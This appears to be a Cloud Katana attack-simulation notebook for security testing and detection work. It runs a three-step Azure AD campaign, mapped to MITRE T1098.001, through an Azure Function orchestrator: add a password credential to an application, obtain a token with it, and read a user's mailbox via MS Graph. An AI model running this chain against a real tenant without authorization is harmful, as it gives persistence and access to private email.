---
jupyter:
  jupytext:
    text_representation:
      extension: .md
      format_name: markdown
      format_version: '1.3'
      jupytext_version: 1.14.7
  kernelspec:
    language: python
---

# Add New Password Credential to Azure AD Application and Read Mail


## Metadata



|                   |    |
|:------------------|:---|
| contributors      | ['Azure'] |
| platform          | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2022-04-28 |
| modification date | 2022-04-28 |
| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003) |
| Techniques        | [T1098.001](https://attack.mitre.org/techniques/T1098/001) |


## Description
A campaign to simulate a threat actor adding password credentials to an Azure AD application, getting an access token with the new credentials and reading mail from a specific user via MS Graph with the security context of the Azure AD application.


## Get OAuth Access Token

```python
from msal import PublicClientApplication
import requests
import time

function_app_url = "https://FUNCTION_APP_NAME.azurewebsites.net"

tenant_id = "TENANT_ID"
public_client_app_id = "KATANA_CLIENT_APP_ID"
server_app_id_uri = "api://" + tenant_id + "/cloudkatana"
scope = server_app_id_uri + "/user_impersonation"

app = PublicClientApplication(
    public_client_app_id,
    authority="https://login.microsoftonline.com/" + tenant_id
)
result = app.acquire_token_interactive(scopes=[scope])
bearer_token = result['access_token']
```

## Set Azure Function Orchestrator

```python
endpoint = function_app_url + "/api/orchestrators/Orchestrator"
```

## Load Campaign

```python
data = {"id": "attackscenario-81b67a16-5218-41e6-8c6d-1fc6a10b757a", "name": "Add New Password Credential to Azure AD Application and Read Mail", "metadata": {"creationDate": "2022-04-28", "modificationDate": "2022-04-28", "platform": ["Azure"], "description": "A campaign to simulate a threat actor adding password credentials to an Azure AD application, getting an access token with the new credentials and reading mail from a specific user via MS Graph with the security context of the Azure AD application.", "contributors": ["Roberto Rodriguez @Cyb3rWard0g"], "mitreAttack": [{"technique": "T1098.001", "tactics": ["TA0003"]}]}, "steps": [{"number": 1, "name": "AddPasswordToAADApp", "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "New-CKAzADAppPassword"}, "parameters": {"appObjectId": {"type": "string", "defaultValue": "test"}}}, "wait": 30}, {"number": 2, "name": "GetAccessToken", "dependsOn": [1], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "Get-CKAccessToken"}, "parameters": {"ClientId": {"type": "string", "defaultValue": "test"}, "GrantType": {"type": "string", "defaultValue": "client_credentials"}, "AppSecret": {"type": "string", "defaultValue": "reference(1).secretText"}}}}, {"number": 3, "name": "GetMailboxMessages", "dependsOn": [2], "execution": {"type": "ScriptModule", "platform": "Azure", "executor": "PowerShell", "module": {"name": "CloudKatanaAbilities", "version": "1.3.1", "function": "Get-CKMailboxMessages"}, "parameters": {"accessToken": {"type": "string", "defaultValue": "reference(2).access_token"}, "userPrincipalName": {"type": "string", "defaultValue": "test"}}}}], "file_name": "attackscenario-81b67a16-5218-41e6-8c6d-1fc6a10b757a"}
```

### Send HTTP Request

```python
http_headers = {'Authorization': 'Bearer ' + bearer_token, 'Accept': 'application/json','Content-Type': 'application/json'}
results = requests.get(endpoint, json=data, headers=http_headers, stream=False).json()

time.sleep(30)
```

### Explore Output

```python
query_status = requests.get(results['statusQueryGetUri'], headers=http_headers, stream=False).json()
query_results = query_status['output']
query_results
```
